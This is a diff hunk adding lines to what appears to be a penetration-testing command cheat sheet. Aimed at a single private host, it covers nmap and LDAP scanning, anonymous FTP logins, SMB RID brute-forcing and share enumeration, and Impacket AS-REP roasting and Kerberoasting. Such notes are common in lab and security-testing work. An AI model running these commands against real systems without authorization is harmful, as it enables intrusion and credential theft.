@@ -22,8 +22,17 @@
     nmap -Pn -sC -sV 172.16.1.10 -p22,80,139,445
     ldap=$(nmap --script "ldap* and not brute" -p 389 172.16.1.10); echo "$ldap"
     nxc ftp 172.16.1.10 --port 21 -u 'anonymous' -p 'anonymous' --ls
+    ftp 172.16.1.10
+    anonymous
+    anonymous
+    ls -a
+    binary
+    ascii
     nxc smb 172.16.1.10 --port 445 -u usernames -p passwords --rid-brute 10000
     nxc smb 172.16.1.10 --port 445 -u usernames -p passwords --shares
+    impacket-smbclient domain/'user':'password'@172.16.1.10
+    shares
+    use
     mysql -h 172.16.1.10 -u root@localhost -e 'show databases;'
     impacket-GetNPUsers -usersfile usernames domain/ -dc-ip 172.16.1.10
     impacket-GetUserSPNs -request-user "$objuser" -dc-ip 172.16.1.10 domain/username:password
